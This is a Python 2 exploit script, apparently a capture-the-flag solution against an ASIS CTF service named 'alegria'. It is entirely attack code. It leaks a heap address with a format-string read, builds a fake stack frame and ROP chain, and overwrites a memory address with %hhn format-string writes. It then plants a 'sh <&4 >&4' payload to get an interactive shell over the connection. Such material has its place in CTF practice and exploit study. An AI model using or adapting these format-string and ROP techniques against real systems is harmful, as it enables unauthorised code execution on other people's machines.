import socket
import time
import telnetlib
import struct

TARGET=('alegria.asis-ctf.ir', 8282)
WAIT=0.5
USER='kitctf'
PW='asdasd'

s=socket.create_connection(TARGET)
def ru(st):
    buf=''
    while not st in buf:
        c=s.recv(1)
        assert c
        buf += c
    return buf

def interact():
    t = telnetlib.Telnet()
    t.sock=s
    t.interact()

def send(x):
    s.sendall(x)
    time.sleep(WAIT)

def p(x):
    return struct.pack('<I', x)

send('2\n')
send('%s\n' % USER)
send('%s\n' % PW)
send('3\n')
send('1\n')

send('10\n')
send('100\n')
send('a'*9 + '\n')
send('%282$p\n')

ru('> ')
send('4\n')
send('3\n')
s.close()
time.sleep(WAIT)

#send('10\n')
#send('100\n')
#send('a'*10 + '\n')
#send('%p %p %p %p\n')

s=socket.create_connection(TARGET)
send('2\n')
send('%s\n' % USER)
send('%s\n' % PW)
send('2\n')
ru('Content: ')
heap = int(ru('\n')[:-1],16) - 0x520
print 'heap @ %08x' % heap
s.close()
time.sleep(WAIT)

stack_frame = heap + 0xcb8
print 'fake stack frame @ %08x' % stack_frame

s=socket.create_connection(TARGET)

send('2\n')
send('%s\n' % USER)
send('%s\n' % PW)
send('3\n')

rop = [0x080489f8, 0x42424242, stack_frame + 12]

send('1\n')
send('10\n')
send('100\n')
send('a'*9 + '\n')
send(p(rop[0]) + p(stack_frame) + p(0xDEADCD80) + 'sh <&4 >&4\0\n')

send('1\n')
send('1000\n')
send('1000\n')
send('a'*108 + ''.join(map(p,rop)) + '\n')

fmt = p(0x0804c024)
fmt += p(0x0804c025)
fmt += p(0x0804c026)
fmt += p(0x0804c027)

cnt = len(fmt)
for i, c in enumerate(p(stack_frame)):
    while cnt != ord(c):
        fmt += 'a'
        cnt = (cnt + 1) % 0x100
    fmt += '%' + str(3 + i) + '$hhn'

assert len(fmt) < 1000
send(fmt + '\n')

send('4\n')
send('3\n')
interact()
